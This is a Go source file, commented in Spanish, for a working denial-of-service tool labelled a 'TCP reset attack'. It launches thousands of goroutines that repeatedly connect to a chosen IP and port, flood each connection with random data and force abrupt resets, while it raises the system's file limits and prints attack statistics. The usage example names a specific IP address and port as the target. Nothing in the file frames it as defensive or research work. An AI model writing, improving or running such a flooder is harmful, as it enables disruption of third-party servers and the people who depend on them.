package main

import (
	"crypto/rand"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
)

// Variables globales atómicas para estadísticas
var (
	stats     = &Statistics{}
	startTime = time.Now()
	running   int32 = 1
)

type Statistics struct {
	connections      int64
	successfulResets int64
	packetsSent      int64
	totalDataSent    int64
	connectionErrors int64
	sendErrors       int64
	tcpErrors        int64
}

func TCPReset(conn net.Conn, size int) {
	defer func() {
		if r := recover(); r != nil {
			atomic.AddInt64(&stats.tcpErrors, 1)
		}
	}()

	buf := make([]byte, size)
	for atomic.LoadInt32(&running) == 1 {
		_, err := rand.Read(buf)
		if err != nil {
			atomic.AddInt64(&stats.sendErrors, 1)
			break
		}

		_, err = conn.Write(buf)
		if err != nil {
			atomic.AddInt64(&stats.sendErrors, 1)
			break
		}

		// Configurar SO_LINGER
		tcpConn, ok := conn.(*net.TCPConn)
		if ok {
			fd, err := tcpConn.File()
			if err == nil {
				linger := unix.Linger{
					Onoff:  1,
					Linger: 0,
				}
				unix.SetsockoptLinger(int(fd.Fd()), unix.SOL_SOCKET, unix.SO_LINGER, &linger)
				fd.Close()
			}
		}

		atomic.AddInt64(&stats.packetsSent, 1)
		atomic.AddInt64(&stats.totalDataSent, int64(size))
	}

	conn.Close()
	atomic.AddInt64(&stats.successfulResets, 1)
}

func CNC(addr string, size int, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		go TCPReset(conn, size)
	}
}

func getSystemStats() map[string]float64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	var memoryPercent float64
	if m.Sys > 0 {
		memoryPercent = float64(m.Alloc) / float64(m.Sys) * 100
	}

	return map[string]float64{
		"memory_percent": memoryPercent,
		"cpu_percent":    0, // Go no tiene un equivalente directo a psutil
		"goroutines":     float64(runtime.NumGoroutine()),
	}
}

func printStats() {
	for atomic.LoadInt32(&running) == 1 {
		time.Sleep(5 * time.Second)
		duration := time.Since(startTime).Seconds()
		systemStats := getSystemStats()

		separator := strings.Repeat("=", 50)
		fmt.Printf("\n%s\n", separator)
		fmt.Println("ESTADÍSTICAS DEL ATAQUE TCP RESET")
		fmt.Printf("%s\n", separator)
		fmt.Printf("Tiempo transcurrido: %.2f segundos\n", duration)
		fmt.Printf("Conexiones establecidas: %d\n", atomic.LoadInt64(&stats.connections))
		fmt.Printf("Resets TCP exitosos: %d\n", atomic.LoadInt64(&stats.successfulResets))
		fmt.Printf("Paquetes enviados: %d\n", atomic.LoadInt64(&stats.packetsSent))
		if totalData := atomic.LoadInt64(&stats.totalDataSent); totalData > 0 {
			fmt.Printf("Datos totales enviados: %.2f MB\n", float64(totalData)/(1024*1024))
		}
		fmt.Printf("Errores de conexión: %d\n", atomic.LoadInt64(&stats.connectionErrors))
		fmt.Printf("Errores de envío: %d\n", atomic.LoadInt64(&stats.sendErrors))
		fmt.Printf("Errores TCP: %d\n", atomic.LoadInt64(&stats.tcpErrors))

		if duration > 0 {
			fmt.Printf("Paquetes/segundo: %.2f\n", float64(atomic.LoadInt64(&stats.packetsSent))/duration)
			if totalData := atomic.LoadInt64(&stats.totalDataSent); totalData > 0 {
				fmt.Printf("MB/segundo: %.2f\n", (float64(totalData)/(1024*1024))/duration)
			}
			fmt.Printf("Conexiones/segundo: %.2f\n", float64(atomic.LoadInt64(&stats.connections))/duration)
		}

		fmt.Println("\nESTADÍSTICAS DEL SISTEMA:")
		fmt.Printf("Goroutines activas: %.0f\n", systemStats["goroutines"])
		fmt.Printf("Uso de memoria: %.2f%%\n", systemStats["memory_percent"])
		fmt.Printf("%s\n\n", separator)
	}
}

func optimizeSystemLimits() {
	var rLimit syscall.Rlimit
	err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	if err != nil {
		log.Printf("Error obteniendo límites: %v\n", err)
		return
	}

	rLimit.Cur = rLimit.Max
	err = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	if err != nil {
		log.Printf("Error ajustando límites: %v\n", err)
		return
	}

	log.Printf("Límite de archivos ajustado a: %d\n", rLimit.Cur)
}

func main() {
	optimizeSystemLimits()

	if len(os.Args) != 5 {
		fmt.Println("Uso: go run tcp_reset.go <IP> <PUERTO> <HILOS> <TAMAÑO>")
		fmt.Println("Ejemplo: go run tcp_reset.go 40.233.31.34 25570 9024 9024")
		os.Exit(1)
	}

	ip := os.Args[1]
	port := os.Args[2]
	threadCount, _ := strconv.Atoi(os.Args[3])
	size, _ := strconv.Atoi(os.Args[4])
	target := net.JoinHostPort(ip, port)

	fmt.Printf("Iniciando ataque a %s\n", target)
	fmt.Printf("Hilos: %d, Tamaño de paquete: %d bytes\n", threadCount, size)
	fmt.Println("Presiona Ctrl+C para detener")
	fmt.Println("Estadísticas cada 5 segundos...\n")

	// Goroutine para estadísticas
	go printStats()

	// WaitGroup para esperar a las goroutines
	var wg sync.WaitGroup

	// Iniciar goroutines de ataque
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go CNC(target, size, &wg)
		if i%1000 == 0 {
			time.Sleep(10 * time.Millisecond)
		}
	}

	fmt.Printf("Iniciados %d hilos de ataque\n", threadCount)

	// Manejar señal de interrupción
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	<-sigCh

	fmt.Println("\nDeteniendo ataque...")
	atomic.StoreInt32(&running, 0)
	wg.Wait()
	time.Sleep(2 * time.Second)
}
